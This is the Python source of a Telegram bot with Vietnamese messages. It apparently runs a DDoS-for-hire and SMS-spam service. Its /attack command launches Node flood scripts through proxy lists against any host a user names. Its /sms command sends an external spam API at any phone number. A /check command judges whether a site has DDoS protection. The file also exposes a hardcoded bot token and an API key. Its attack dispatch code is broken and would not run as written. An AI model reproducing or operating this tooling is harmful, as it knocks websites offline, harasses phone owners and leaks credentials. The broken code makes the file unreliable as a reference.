import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '8075150737:AAGiXi9V8OGXZqIGdS5e6Q8h5iEaB9GCsaI'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002535925512

allowed_users = []
processes = []
ADMIN_ID = 7534950201
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi Danh Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhap Đung Đinh Dang /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đa Them Nguoi Dung Co ID La: {user_id} Su Dung Lenh 30 Ngay')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='Vui Long Cho...')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://link4m.co/st?api=68212942c9a9380c6e353eda&url=tungdzvcl113.com')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Lay Key Loi Vui Long Su Dung Lai Lenh /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "FLay Key Loi Vui Long Su Dung Lai Lenh /getkey"
    
    text = f'''
- Cam On Ban Đa Getkey -
- Link Lay Key Hom Nay La: {url_key}
- Nhap Key Bang Lenh /key + [key] -
 [Luu y: moi key chi co 1 nguoi dung]
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui Long Nhap Key\nVi Du /key gioiddos79667\nSu Dung Lenh /getkey Đe Lay Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nhap Key Thanh Cong')
    else:
        bot.reply_to(message, 'Key Sai Hoac Het Han\nKhong Su Dung Key Cua Nguoi Khac!')


@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
📌 Tat Ca Cac Lenh:
1 Lenh Lay Key Va Nhap Key
- /getkey : Đe lay key
- /key + [Key] : Kich Hoat Key
2 Lenh Spam 
- /sms + [So Đien Thoai] : Spam VIP
3 Lenh DDoS ( Tan Cong Website )
- /attack + [methods] + [host]
- /methods : Đe Xem Methods
- /check + [host] : Kiem Tra AntiDDoS
- /proxy : Check So Luong Proxy
4 Lenh Co Ich ^^
- /code + [host] : Lay Source Code Website
- /getproxy : Proxy Se Tu Đong Update Sau 10 Phut
[ Proxy Live 95% Die 5 % ]
- /time : So Thoi Gian Bot Hoat Đong
5 Info Admin
- /muakey : Đe Mua Key VIP
- /admin : Info Admin
- /on : On Bot
- /off : Off Bot
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['sms'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hien đang tat. Vui long cho khi nao đuoc bat lai.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui long nhap Key\nSu dung lenh /getkey đe lay Key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Vui long nhap đung cu phap.\nVi du: /sms + [so đien thoai]')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911', '0376349783']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'Ban khong đuoc spam so nay.')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
        remaining_time = int(90 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Vui long đoi {remaining_time} giay truoc khi tiep tuc su dung lenh nay.')
        return
    
    cooldown_dict[user_id] = time.time()

    username = message.from_user.username

    bot.reply_to(message, f'@{username} Đang Tien Hanh Spam')

    args = message.text.split()
    phone_number = args[1]

    # Gui du lieu toi api
    url = f"https://api.viduchung.info/spam-sms/?phone={phone_number}"
    response = requests.get(url)

    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thanh Cong!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ So Tan Cong: {phone_number} \n┣➤ Group: @botgioitool \n┗━━━━━━━━━━━━━━➤')
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 Tat Ca Methods:
🚀 Layer7 
[ Khong Gov, Edu ]
flood
bypass
bestflood
GOD 
🚀 Layer4
TCP-FLOOD
UDP-FLOOD
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đa Dung Lenh Tan Cong, Cam On Ban Đa Su Dung")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hien đang tat. Vui long cho khi nao đuoc bat lai.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui long nhap Key\nSu dung lenh /getkey đe lay Key')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui long nhap đung cu phap.\nVi du: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui long đoi {remaining_time} giay truoc khi su dung lai lenh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui long nhap ca port.\nVi du: /attack {method} {host} [port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Khong đuoc phep tan cong trang web co ten mien {blocked_domain}")
                return

    if method in ['bypass', 'flood', 'bestflood', 'zentra', 'UDP-FLOOD', 'TCP-FLOOD']:
        # Update the command and duration based on the selected method
         elif method == 'Bypass':
            command = ["node", "bypass.js", host, "90", "64", "5", "proxy.txt"]
            duration = 90
        elif method == 'zentra':
            command = ["node", "zentra.js", host, "120", "64", "5", "text.txt", "mt"]
            duration = 120
            if not port.isdigit():
                bot.reply_to(message, 'Port phai la mot so nguyen duong.')
                return

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giay\n┣➤ Group: @botgioitool \n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Phuong thuc tan cong khong hop le. Su dung lenh /methods đe xem phuong thuc tan cong')

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"So luong proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Khong tim thay file proxy.txt.")
    else:
        bot.reply_to(message, 'Ban khong co quyen su dung lenh nay.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"So proxy moi update la: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ban khong co quyen su dung lenh nay.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ban khong co quyen su dung lenh nay.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đa đuoc tat. Tat ca nguoi dung khong the su dung lenh khac.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ban khong co quyen su dung lenh nay.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đa đuoc khoi đong lai. Tat ca nguoi dung co the su dung lai lenh binh thuong.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hien đang tat. Vui long cho khi nao đuoc bat lai.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui long nhap Key\nSu dung lenh /getkey đe lay Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui long nhap đung cu phap.\nVi du: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Khong the lay ma nguon tu trang web nay. Vui long kiem tra lai URL.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web khong phai la HTML hoac PHP. Vui long thu voi URL trang web chua file HTML hoac PHP.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Co loi xay ra: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui long nhap đung cu phap.\nVi du: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiem tra xem URL co http/https chua, neu chua them vao
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loai bo tien to "www" neu co
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip cua website: {url}\nLa: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website co 1 ip co kha nang khong antiddos."
        else:
            reply += "Website co nhieu hon 1 ip kha nang antiddos rat cao.\nKhong the tan cong website nay."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Co loi xay ra: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: t.me/gioihocdev")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Ham tinh thoi gian hoat đong cua bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hien đang tat. Vui long cho khi nao đuoc bat lai.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui long nhap Key\nSu dung lenh /getkey đe lay Key')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phut Tu Update\nSo luong proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxybynhakhoahoc.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Khong tim thay file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} gio, {minutes} phut, {seconds} giay'
    bot.reply_to(message, f'Bot Đa Hoat Đong Đuoc: {uptime_str}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lenh khong hop le. Vui long su dung lenh /help đe xem danh sach lenh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
